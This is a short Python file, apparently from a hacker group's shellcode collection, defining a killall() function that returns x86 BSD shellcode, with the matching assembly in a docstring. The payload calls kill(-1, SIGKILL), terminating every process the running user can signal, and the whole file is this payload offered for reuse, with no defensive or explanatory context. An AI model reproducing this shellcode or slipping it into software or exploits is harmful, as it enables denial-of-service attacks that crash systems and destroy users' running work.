#***(C)oDed bY suN8Hclf***
#       DaRk-CodeRs Group productions, kid


def killall():
	shellcode =  r"\x31\xc0\x6a\x09\x48\x50\x40\xb0\x25\x50\xcd\x80"
	return shellcode

"""
section .text
global _start

_start:
xor eax, eax
push byte 9 ; SIGKILL
dec eax
push eax    ; -1 (0xffffffff)
inc eax
mov al, 37  ;kill() syscall number, check /usr/src/sys/kern/syscalls.master for details
push eax
int 0x80

"""